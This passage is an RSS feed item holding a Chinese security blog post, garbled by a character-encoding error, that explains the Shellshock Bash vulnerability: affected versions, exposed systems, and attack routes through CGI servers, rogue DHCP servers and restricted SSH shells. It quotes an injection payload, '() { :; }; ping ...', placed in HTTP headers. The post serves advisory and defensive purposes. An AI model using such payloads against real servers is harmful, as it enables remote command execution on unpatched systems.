                <link>https://devco.re/blog/2014/10/13/android-webview-left-shortcuts-for-hacker/</link>
                <guid>https://devco.re/blog/2014/10/13/android-webview-left-shortcuts-for-hacker</guid>
                <pubDate>Mon, 13 Oct 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Shellshock (Bash CVE-2014-6271) å¨è„…ä»åœ¨æ“´å¤§ä¸­ï¼Œä½†ç„¡éœ€éåº¦ææ…Œ</title>
                <description>&lt;p&gt;è‡ª 9/24 ä»¥ä¾†ï¼Œä¸å°‘è³‡è¨Šåœˆæœ‹å‹æ—¥ä»¥ç¹¼å¤œçš„å¿™ç¢Œï¼Œé€™éƒ½å¤šè™§äº†è—åœ¨ Bash è£¡ 22 å¹´çš„å®‰å…¨æ¼æ´ï¼&lt;a href=&quot;https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29&quot;&gt;Shellshock&lt;/a&gt; (Bash CVE-2014-6271)ã€‚å°æ–¼æƒ¡æ„æ”»æ“Šè€…è€Œè¨€ï¼Œé€™æ˜¯ä»Šå¹´ä¾†ç¬¬äºŒæ³¢æ·˜é‡‘æ½®ï¼Œç›¸è¼ƒæ–¼ä¸Šæ¬¡ &lt;a href=&quot;https://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;Heartbleed&lt;/a&gt; é§­å®¢å€‘çš„åˆ®åˆ®æ¨‚éŠæˆ²éœ€è¦æ‹¼é‹æ°£ï¼Œé€™æ¬¡çš„ Shellshock åªè¦ä¸€ç™¼ç¾åˆ©ç”¨é»ï¼Œå°±èƒ½é¦¬ä¸Šæ“æœ‰åŸºæœ¬çš„ç³»çµ±æ“ä½œæ¬Šé™ï¼Œä¹Ÿé›£æ€ª &lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271&quot;&gt;NVD&lt;/a&gt; çµ¦äºˆ Shellshock æœ€åš´é‡çš„ 10.0 åˆ†å½±éŸ¿ç­‰ç´šã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;Shellshock å—å½±éŸ¿çš„ Bash ç‰ˆæœ¬å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Bash 4.3 Patch 25 ï¼ˆå«ï¼‰ä»¥å‰ç‰ˆæœ¬&lt;/li&gt;
  &lt;li&gt;Bash 4.2 Patch 48 ï¼ˆå«ï¼‰ä»¥å‰ç‰ˆæœ¬&lt;/li&gt;
  &lt;li&gt;Bash 4.1 Patch 12 ï¼ˆå«ï¼‰ä»¥å‰ç‰ˆæœ¬&lt;/li&gt;
  &lt;li&gt;Bash 4.0 Patch 39 ï¼ˆå«ï¼‰ä»¥å‰ç‰ˆæœ¬&lt;/li&gt;
  &lt;li&gt;Bash 3.2 Patch 52 ï¼ˆå«ï¼‰ä»¥å‰ç‰ˆæœ¬&lt;/li&gt;
  &lt;li&gt;Bash 3.1 Patch 18 ï¼ˆå«ï¼‰ä»¥å‰ç‰ˆæœ¬&lt;/li&gt;
  &lt;li&gt;Bash 3.0 Patch 17 ï¼ˆå«ï¼‰ä»¥å‰ç‰ˆæœ¬&lt;/li&gt;
  &lt;li&gt;Bash 2.0.5b Patch 8 ï¼ˆå«ï¼‰ä»¥å‰ç‰ˆæœ¬&lt;/li&gt;
  &lt;li&gt;Bash 1.14.7 ï¼ˆå«ï¼‰ä»¥å‰ç‰ˆæœ¬&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;é€™æ¬¡çš„å•é¡Œå‡ºåœ¨ bash å°ç’°å¢ƒè®Šæ•¸çš„è§£æä¸Šã€‚è‹¥æœ‰è¾¦æ³•åœ¨ç’°å¢ƒè®Šæ•¸ä¸­å¡å…¥æƒ¡æ„çš„ç¨‹å¼ç¢¼ï¼Œä¸¦ä¸”é †åˆ©å°‡é€™äº›ç’°å¢ƒè®Šæ•¸å‚³å…¥ bashï¼Œbash å°±æœƒå› è§£æéŒ¯èª¤è€ŒåŸ·è¡Œæƒ¡æ„æŒ‡ä»¤ã€å’Œè®“æ”»æ“Šè€…èƒ½ç›´æ¥å°ç³»çµ±é€²è¡ŒåŸºæœ¬çš„æ“ä½œã€‚åŸå§‹ç¢¼åŠæ›´é€²éšçš„åŸç†è«‹åƒè€ƒ&lt;a href=&quot;http://blog.erratasec.com/2014/09/the-shockingly-bad-code-of-bash.html&quot;&gt;é€™ç¯‡&lt;/a&gt;ã€‚Shellshock ä¹‹æ‰€ä»¥åš´é‡ï¼Œä¸€ä¾†æ˜¯å› ç‚ºæ”»æ“Šèªæ³•ç›¸ç•¶ç°¡å–®ï¼Œåªéœ€è¦ä¸€è¡ŒæŒ‡ä»¤ï¼Œå°±å¯ä»¥ç›´æ¥å°ç³»çµ±é€²è¡Œæ“ä½œï¼›äºŒä¾†æ˜¯å› ç‚º bash ä½¿ç”¨ç¯„åœæ¥µå»£ï¼Œå¤šæ¬¾ä½œæ¥­ç³»çµ±é è¨­ shell å°±æ˜¯ bashã€‚ å¸¸è¦‹çš„ä½œæ¥­ç³»çµ±èˆ‡å…¶é è¨­ shell æ•´ç†å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;ä½œæ¥­ç³»çµ±&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;é è¨­ shell&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;CentOS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;bash&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Fedora&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;bash&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;RHEL&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;bash&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Mac OS X&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;bash&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Android&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;æ—©æœŸæ˜¯ ash, 3.0 é–‹å§‹æ˜¯ mksh&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Debian&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;sh (Lenny, 5.0)&lt;br /&gt;dash (Squeeze, 6.0)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;embedded device&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;å¤§éƒ¨åˆ†ä½¿ç”¨ busybox (ash)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;FreeBSD&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;tcsh&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Ubuntu&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;dash&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;iOS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Jailbreak å¾Œæ˜¯ bash&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;
æˆ‘å€‘çœ‹åˆ°è¿‘åŠæ•¸çŸ¥åçš„ un*x ç³»çµ±é è¨­ä½¿ç”¨ bashï¼Œå¯ä»¥æ¨æƒ³é€™æ¬¡å½±éŸ¿ç¯„åœæœ‰å¤šå»£ï¼Œå°¤å…¶æ˜¯è¨±å¤šæœå‹™éƒ½æ¶æ§‹åœ¨é€™ä¹‹ä¸Šï¼Œè‹¥é­å—åˆ°æ”»æ“Šï¼Œæå¤±çš„å¯èƒ½æ˜¯ä¼æ¥­çš„æ©Ÿå¯†è³‡æ–™æˆ–å®¢æˆ¶è³‡æ–™ã€‚è‡³æ–¼æ²’æœ‰é è¨­ä½¿ç”¨ bash çš„ä½œæ¥­ç³»çµ±ï¼Œä¹Ÿä¸¦ä¸æ„å‘³è‘—å®Œå…¨æ²’æœ‰é¢¨éšªï¼Œä¾‹å¦‚ Ubuntu åœ¨ DHCP å®¢æˆ¶ç«¯ä½¿ç”¨åˆ° bash ï¼Œå°±ä»ç„¶æœƒæœ‰é¢¨éšªï¼Œä¸‹é¢æ–‡ç« ä¸­ä¹Ÿæœƒæåˆ°é€™æ¨£çš„ç‹€æ³ã€‚å¦å¤–ï¼Œæ—©æœŸæ–°èä¸­å¸¸å‡ºç¾ç‰©è¯ç¶²è¨­å‚™æœƒå—æ­¤æ¼æ´å½±éŸ¿çš„å ±å°ï¼Œç¶“éæˆ‘å€‘å¯¦æ¸¬ï¼Œç‰©è¯ç¶²è¨­å‚™ç‚ºæ±‚ç²¾ç°¡ï¼Œå¤§å¤šä½¿ç”¨ busyboxï¼Œè€Œå…¶ shell ç‚º ashï¼Œæ•…å¤§å¤šæ•¸è¨­å‚™åœ¨é€™æ¬¡ Shellshock å¨è„…ä¸­å½±éŸ¿ä¸å¤§ï¼Œä¸éå„˜ç®¡ç‰©è¯ç¶²è¨­å‚™é€ƒéäº†é€™æ¬¡ Shellshock äº‹ä»¶ï¼Œæœ‰è¨±å¤šè¨­å‚™ä»ç„¶æ˜¯&lt;a href=&quot;http://devco.re/blog/2014/09/24/security-of-ip-camera-and-nvr/&quot;&gt;èµ¤è£¸è£¸&lt;/a&gt;çš„ã€‚&lt;/p&gt;

&lt;h3 id=&quot;å¸¸è¦‹çš„-shellshock-åˆ©ç”¨æ–¹å¼&quot;&gt;å¸¸è¦‹çš„ Shellshock åˆ©ç”¨æ–¹å¼&lt;/h3&gt;

&lt;p&gt;Shellshock æ¼æ´è¢«å…¬å¸ƒå¾Œï¼Œæƒ¡æ„æ”»æ“Šè€…ç„¡ä¸æƒ³è¦é€éé€™å€‹æ¼æ´å°ä¼ºæœå™¨é€²è¡Œé ç«¯æ”»æ“Šï¼Œä¸€äº›é ç«¯æ”»æ“Šæ¦‚å¿µä¹Ÿé™¸çºŒè¢«è­‰å¯¦ã€‚æœ€æ—©çš„&lt;a href=&quot;http://blog.erratasec.com/2014/09/bash-shellshock-scan-of-internet.html&quot;&gt;å…¬é–‹å¤§é‡æƒæ&lt;/a&gt;æ˜¯ç”± Errata Security åœ¨å…¶éƒ¨è½æ ¼å…¬å¸ƒæŠ€è¡“ç´°ç¯€ï¼Œä»–å€‘åœ¨ HTTP è«‹æ±‚è¡¨é ­ä¸­çš„ Cookieã€Hostã€Referer ä¸­æ”¾ç½®æƒ¡æ„èªæ³• &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;() { :; }; ping -c 3 209.126.230.74&lt;/code&gt;ï¼Œä¸¦ä¸”åˆ©ç”¨ masscan å°å…¨ä¸–ç•Œ HTTP ä¼ºæœå™¨ (port 80) é€²è¡Œæƒæã€‚å› ç‚ºä¸€èˆ¬ä¼ºæœå™¨æœƒå°‡ HTTP è¡¨é ­ä¸­ä¹‹å…§å®¹æ”¾å…¥ç’°å¢ƒè®Šæ•¸ä¸­ï¼Œè‹¥ä¼ºæœå™¨é¦–é å…¥å£ç¨‹å¼æœ¬èº«æ˜¯ bash shell script æˆ–è€…å…¶å­ç¨‹åºæœ‰å‘¼å«åˆ° bashï¼Œå°±æœƒå—åˆ°æƒ¡æ„èªæ³•çš„å½±éŸ¿ï¼ŒåŸ·è¡Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping -c 3 209.126.230.74&lt;/code&gt; æŒ‡ä»¤ã€‚&lt;/p&gt;

&lt;h4 id=&quot;æ”»æ“Šä½¿ç”¨-cgi-çš„ç¶²é ä¼ºæœå™¨&quot;&gt;æ”»æ“Šä½¿ç”¨ CGI çš„ç¶²é ä¼ºæœå™¨&lt;/h4&gt;

&lt;p&gt;åˆ©ç”¨åŒæ¨£çš„é“ç†ï¼Œæƒ¡æ„æ”»æ“Šè€…é–‹å§‹åœ¨ HTTP è¡¨é ­ä¸­ç½®å…¥æƒ¡æ„çš„èªæ³•ï¼Œå¤§é‡å»æƒæç¶²è·¯ä¸Šçš„ CGI ç¶²é ï¼Œå› ç‚ºé€™ç¨®ç¶²é å¸¸å‘¼å«ç³»çµ±æŒ‡ä»¤ï¼Œæ‰€ä»¥æˆåŠŸæ©Ÿç‡éƒ½é —é«˜ï¼Œæ”»æ“ŠæˆåŠŸçš„çµæœå¦‚ä¸‹åœ–ï¼Œå¾é€™å¼µåœ–ä¹Ÿå¯äº†è§£é€™å€‹å¼±é»å¯ä»¥ç°¡å–®åœ°é€éä¸€å€‹åƒæ•¸å°±èƒ½ç›´æ¥è®“ç³»çµ±åŸ·è¡Œä»»æ„æŒ‡ä»¤ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140930/shellshock_cgi2.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140930/shellshock_cgi2.png&quot; alt=&quot;æ”»æ“Šä½¿ç”¨ CGI çš„ç¶²é ä¼ºæœå™¨&quot; title=&quot;æ”»æ“Šä½¿ç”¨ CGI çš„ç¶²é ä¼ºæœå™¨&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;è©³ç´°çš„å¯¦ä½œæµç¨‹è«‹åƒè€ƒä¸‹é¢å½±ç‰‡ï¼š&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/RUsHcZi2hIU&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;æˆ‘å€‘åœ˜éšŠä¹Ÿåœ¨ CGI ç’°å¢ƒä¸‹åŸ·è¡Œå¹¾ç¨®ç¨‹å¼èªè¨€é€²è¡Œæ¸¬è©¦ï¼Œç™¼ç¾ç”¨åˆ°ä»¥ä¸‹ function æ™‚æœƒè®€å–åˆ°ç’°å¢ƒè®Šæ•¸ï¼ˆdate åªæ˜¯ç¯„ä¾‹ï¼Œå¯ä»£æ›ç‚ºå…¶ä»–ç³»çµ±æŒ‡ä»¤ï¼‰ï¼Œå› æ­¤è‹¥ä¼ºæœå™¨åœ¨ CGI ç’°å¢ƒä¸‹ä½¿ç”¨é€™äº› functionï¼Œæœƒç‚ºä¼ºæœå™¨æœ¬èº«å¸¶ä¾†åš´é‡é¢¨éšªã€‚&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Language&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Vulnerable Function&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Perl&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;exec(â€œdate &amp;gt; /dev/nullâ€);&lt;br /&gt;open(SHELLSHOCK, â€œ| date &amp;gt; /dev/nullâ€);&lt;br /&gt;system(â€œdate &amp;gt; /dev/null;â€);&lt;br /&gt;print `date &amp;gt; /dev/null`&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;PHP&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;exec(â€˜dateâ€™);&lt;br /&gt;system(â€˜dateâ€™);&lt;br /&gt;mb_send_mail();&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Python&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;os.system(â€˜dateâ€™)&lt;br /&gt;subprocess.call(â€˜dateâ€™, shell=True)&lt;br /&gt;subprocess.Popen(â€˜dateâ€™, shell=True)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Ruby&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;`date`&lt;br /&gt;exec â€˜dateâ€™&lt;br /&gt;system â€˜dateâ€™&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;å»ºç½®æƒ¡æ„-dhcp-ä¼ºæœå™¨æ„ŸæŸ“é€£ç·šä½¿ç”¨è€…&quot;&gt;å»ºç½®æƒ¡æ„ DHCP ä¼ºæœå™¨æ„ŸæŸ“é€£ç·šä½¿ç”¨è€…&lt;/h4&gt;

&lt;p&gt;åŒæ™‚ï¼Œæœ‰å¦ä¸€æ‰¹äººç™¼ç¾æŸäº›ä½œæ¥­ç³»çµ±åœ¨é€²è¡Œ DHCP é€£ç·šæ™‚ï¼Œæœƒå°‡ DHCP ä¼ºæœå™¨å‚³å…¥çš„ä¸€äº›è³‡è¨Šå¡å…¥åˆ°ç’°å¢ƒè®Šæ•¸ä¸­ã€‚æ–¼æ˜¯ï¼Œè‹¥å»ºç½®ä¸€å€‹æƒ¡æ„ DHCP ä¼ºæœå™¨ï¼Œå°å…¶é€£ç·šçš„ä½¿ç”¨è€…å°±æœ‰å¾ˆé«˜çš„æ©Ÿæœƒé­å—æ”»æ“Šã€‚æˆ‘å€‘å¯¦éš›åšäº†å¯¦é©—æ”»æ“Šä¸€èˆ¬ä½¿ç”¨è€…ï¼Œåœ¨ä½¿ç”¨è€…å»ºç«‹é€£ç·šçš„ç•¶ä¸‹æ”¾ç½®å¾Œé–€ï¼Œå¯¦é©—éç¨‹å¦‚ä¸‹å½±ç‰‡ï¼š&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/rSj1v8pFVKg&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;&lt;br /&gt;
æˆ‘å€‘ä¹Ÿåˆ†åˆ¥æ¸¬è©¦äº†åœ¨ä¸åŒä½œæ¥­ç³»çµ±ä¸‹æ˜¯å¦æœƒå—åˆ°æƒ¡æ„ DHCP ä¼ºæœå™¨å½±éŸ¿ï¼ŒåŸºæœ¬ä¸Šï¼Œå¸¸è¦‹çš„ un*x ç³»çµ±é–‹æ©Ÿå¾Œè‡ªå‹•é€£ç·šåŸºæœ¬ä¸Šéƒ½æœƒä¸­æ‹›ã€‚&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;OS&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Version&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Vulnerable&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;CentOS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;7.0&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;YES&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Debian&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;7.6&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;YES&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Fedora&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;20&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;YES&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Ubuntu&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;10.04.1 LTS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;YES&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Ubuntu&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;14.04.1 LTS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;YES&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Android&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;4.4.4&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Apple iOS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;7.0.4&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;FreeBSD&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;10.0&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Gentoo&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;20140925&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO (å·²ä¿®å¾©)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Linux Mint&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;17 â€œQianaâ€ Cinnamon&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO &lt;sup id=&quot;fnref:note2&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:note2&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Linux Mint&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Debian 201403 Cinnamon&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO &lt;sup id=&quot;fnref:note2:1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:note2&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Mac OS X&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;10.9.5&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;openSUSE&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;13.2&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO &lt;sup id=&quot;fnref:note1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:note1&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Synology&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;5.0-4493 update 7&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO (å·²ä¿®å¾©)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ç¹é-gitsubversion-ä¼ºæœå™¨çš„-shell-é™åˆ¶&quot;&gt;ç¹é Git/Subversion ä¼ºæœå™¨çš„ shell é™åˆ¶&lt;/h4&gt;

&lt;p&gt;Shellshock ä¹Ÿå¸¸è¢«åˆ©ç”¨ä¾†ç¹éä¼ºæœå™¨çš„ shell é™åˆ¶ï¼Œæœ€å¸¸è¦‹çš„å°±æ˜¯ Git å’Œ Subversion ä¼ºæœå™¨ï¼š
é€šå¸¸é€™äº›ä¼ºæœå™¨å…è¨±é€é SSH é€£ç·šï¼Œä½†ç™»å…¥å¾Œéƒ½å°æ‡‰è‘—å—é™åˆ¶çš„ shellã€‚é€éæ­¤æ¼æ´ï¼Œå¯ä»¥ç¹é shell çš„é™åˆ¶ï¼ŒåŸ·è¡ŒæŒ‡ä»¤å¦‚ä¸‹åœ–ã€‚ï¼ˆè¨»ï¼šOS ä¸­ git user é è¨­ shell è¦ç‚º bash æ‰æœƒå—åˆ°å½±éŸ¿ï¼‰&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140930/shellshock_test_git.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140930/shellshock_test_git.png&quot; alt=&quot;ç¹é Git/Subversion ä¼ºæœå™¨çš„ shell é™åˆ¶&quot; title=&quot;ç¹é Git/Subversion ä¼ºæœå™¨çš„ shell é™åˆ¶&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ä¸€èˆ¬æˆ‘å€‘è¦å¯¦ä½œç‰¹å®šä½¿ç”¨è€…ç™»å…¥ ssh åªèƒ½åšç‰¹å®šçš„äº‹æƒ…ï¼Œå¸¸å¸¸æœƒåœ¨ sshd_config è¨­å®š ForceCommandï¼Œæˆ–æ˜¯åœ¨ authorized_keys è¨­å®š command= å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;command=&quot;[path]/gl-auth-command sitaram&quot;,[more options] ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA18S2t...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€™æ¬¡æœƒå—åˆ° Shellshock å½±éŸ¿ï¼Œå°±æ˜¯å› ç‚ºé€™äº›è¨­å®šæœƒåœ¨ä½¿ç”¨è€…é€é ssh ç™»å…¥æ™‚ï¼Œå‘¼å« bash åŸ·è¡Œï¼Œç•¶ç’°å¢ƒè®Šæ•¸è¢«å¼•å…¥ï¼Œæƒ¡æ„çš„ç¨‹å¼ç¢¼å°±æœƒè¢«åŸ·è¡Œäº†ã€‚&lt;/p&gt;

&lt;h3 id=&quot;shellshock-å¨è„…ä»åœ¨æ“´å¤§&quot;&gt;Shellshock å¨è„…ä»åœ¨æ“´å¤§&lt;/h3&gt;

&lt;p&gt;ç›®å‰ä¸ç®¡æ˜¯ç™½å¸½é§­å®¢æˆ–æ˜¯é»‘å¸½é§­å®¢éƒ½é‚„åœ¨æŒçºŒå°‹æ‰¾å¯ä»¥åˆ©ç”¨ Shellshock çš„åœ°æ–¹ï¼Œå¦‚åŒå‰é¢æ‰€è¿°ï¼Œæ‰¾åˆ°å¯ä»¥å¯«å…¥ç’°å¢ƒè®Šæ•¸çš„åœ°æ–¹ï¼Œä¸¦ä¸”é †åˆ©å‚³å…¥ bash åŸ·è¡Œï¼Œå°±å¯ä»¥åˆ©ç”¨è©²å¼±é»ä¾†åŸ·è¡Œæ›´é€²ä¸€æ­¥çš„æ”»æ“Šã€‚&lt;/p&gt;

&lt;p&gt;å¾ Shellshock çˆ†ç™¼è‡³ä»Šï¼Œé™¸é™¸çºŒçºŒå‚³å‡ºäº†å¾ˆå¤šå…¬å¸çš„ç”¢å“å—åˆ°æ­¤å¼±é»å½±éŸ¿ï¼Œæ•´ç†&lt;a href=&quot;http://www.kb.cert.org/vuls/byvendor?searchview&amp;amp;Query=FIELD+Reference=252743&amp;amp;SearchOrder=4&quot;&gt;åœ¨æ­¤&lt;/a&gt;ï¼Œä¹Ÿæœ‰ä¸€äº› POC æ•´ç†åœ¨&lt;a href=&quot;https://github.com/mubix/shellshocker-pocs/&quot;&gt;é€™è£¡&lt;/a&gt;ã€‚ å…¶ä¸­ä¸ä¹å‡ºç¾ä¸€äº›å¸¸ç”¨çŸ¥åå¥—ä»¶å¦‚ï¼šOpenVPNã€Pure-FTPdï¼Œè€Œä¸”æŒçºŒæ›´æ–°ä¸­ã€‚&lt;/p&gt;

